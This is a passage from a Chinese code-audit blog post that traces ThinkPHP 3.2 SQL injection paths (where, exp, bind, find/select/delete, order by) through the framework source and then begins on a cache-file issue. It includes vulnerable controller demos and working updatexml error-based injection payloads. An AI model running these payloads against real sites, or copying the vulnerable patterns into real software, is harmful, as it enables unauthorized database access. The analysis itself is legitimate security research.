break;\n```\n\n$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为\n\n```\n1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png)\n\n#### **exp注入**\n\n漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效\n\n```php\npublic function  getuser(){\n        $User = D('User');\n        $map = array('id' => $_GET['id']);\n        $user = $User->where($map)->find();\n        dump($user);\n}\n```\n\n直接在$user进行断点，F7跟进，跳过where方法，跟进find->select->buildSelectSql->parseSql->parseWhere\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png)\n\n跟进parseWhereItem方法，此时参数$val为一个数组，{'exp','sql注入exp'}\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png)\n\n此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为\n\n```\nid[0]=exp&id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png)\n\n上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。\n\n```php\nif(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value))\n```\n\n#### **bind注入**\n\n漏洞demo\n\n```php\npublic function  getuser(){\n        $data['id'] = I('id');\n        $uname['username'] = I('username');\n        $user = M('User')->where($data)->save($uname);\n        dump($user);\n}\n```\n\nF8跟进save方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png)\n\n生成sql语句在update方法中\n\n```php\npublic function update($data,$options) {\n        $this->model  =   $options['model'];\n        $this->parseBind(!empty($options['bind'])?$options['bind']:array());\n        $table  =   $this->parseTable($options['table']);\n        $sql   = 'UPDATE ' . $table . $this->parseSet($data);\n        if(strpos($table,',')){// 多表更新支持JOIN操作\n            $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:'');\n        }\n        $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');\n        if(!strpos($table,',')){\n            //  单表更新支持order和lmit\n            $sql   .=  $this->parseOrder(!empty($options['order'])?$options['order']:'')\n                .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');\n        }\n        $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');\n        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);\n    }\n```\n\n在parseSet方法中，可以将传入的参数替换成:0\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png)\n\n在bindParam方法中，$this->bind属性返回array(':0'=>参数值)\n\n```php\nprotected function bindParam($name,$value){\n        $this->bind[':'.$name]  =   $value;\n}\n```\n\n继续跟进parseWhere->parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png)\n\n由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png)\n\n所以最终的payload为\n\n```\nid[0]=bind&id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&username=fanxing\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png)\n\n#### **find/select/delete注入**\n\n先分析find注入，在控制器中写个漏洞demo\n\n```php\npublic function getuser(){\n    $user = M('User')->find(I('id'));\n    dump($user);\n}\n```\n\n当传入id[where]=1p时候，在user进行断点，F7跟进find->_parseOptions方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/9.png)\n\n$options['where']为字符串，导致不能执行_parseType方法转化数据，进行跟进select->buildSelectSql->parseSql->parseWhere方法，传入的$where为字符串，直接执行了if语句\n\n```php\nprotected function parseWhere($where) {\n        $whereStr = '';\n        if(is_string($where)) {\n            // 直接使用字符串条件\n            $whereStr = $where;\n            ......\n        }\n        return empty($whereStr)?'':' WHERE '.$whereStr;\n```\n\n当传入id=1p，就不能进行注入了，具体原因在find->\\_parseOptions->\\_parseType方法，将传入的参数进行了强转化为整形\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/10.png)\n\n所以，payload为\n\n```\n?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/11.png)\n\nselect和delete原理同find方法一样，只是delete方法多增加了一个判断是否为空\n\n```php\nif(empty($options['where'])){\n            // 如果条件为空 不进行删除操作 除非设置 1=1\n            return false;\n        }        \n        if(is_array($options['where']) && isset($options['where'][$pk])){\n            $pkValue            =  $options['where'][$pk];\n        }\n\n        if(false === $this->_before_delete($options)) {\n            return false;\n        }   \n```\n\n#### **order by注入**\n\n先在控制器中写个漏洞demo\n\n```php\npublic function user(){\n    $data['username'] = array('eq','admin');\n    $user = M('User')->where($data)->order(I('order'))->find();\n    dump($user);\n}\n```\n\n在user变量处断点，F7跟进，find->select->buildSelectSql->parseSql方法\n\n```php\n$this->parseOrder(!empty($options['order'])?$options['order']:''),\n```\n\n当$options['order']参数参在时，跟进parseOrder方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/12.png)\n\n当不为数组时，直接返回order by + 注入pyload，所以注入payload为\n\n```\norder=id and(updatexml(1,concat(0x7e,(select user())),0))\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/13.png)\n\n#### **缓存漏洞**\n\n在ThinkPHP3.2中，缓存函数有F方法和S方法，两个方法有什么区别呢，官方介绍如下\n\n```\nF方法：相当于PHP自带的file_put_content和file_get_content函数，没有太多存在时间的概念，是文件存储数据的方式。常用于文件配置。\nS方法：文件缓存，有生命时长，时间到期后缓存内容会得到更新。常用于单页面data缓存。\n```\n\n这里F方法就不介绍了，直接看S方法\n\n```php\npublic function test(){\n    S('name',I('test'));\n}\n```\n\n跟进查看S方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/14.png)\n\nset方法写入缓存\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/15.png)\n\n跟进filename方法，此方法获取写入文件的路径，保存在../Application/Runtime/Temp目录下\n\n```php\nprivate function filename($name) {\n        $name\t=\tmd5(C('DATA_CACHE_KEY').$name);\n        if(C('DATA_CACHE_SUBDIR')) {\n            // 使用子目录\n            $dir   ='';\n            for($i=0;$i<C('DATA_PATH_LEVEL');$i++) {\n                $dir\t.=\t$name{$i}.'/';\n            }\n            if(!is_dir($this->options['temp'].$dir)) {\n                mkdir($this->options['temp'].$dir,0755,true);\n            }\n            $filename\t=\t$dir.$this->options['prefix'].$name.'.php';\n        }else{\n            $filename\t=\t$this->options['prefix'].$name.'.php';\n        }\n        return $this->options['temp'].$filename;\n    }\n```\n\n并将S传入的name进行md5值作为文件名，最终通过file_put_contents函数写入文件。\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/16.png)\n\n","tags":["代码审计"]}]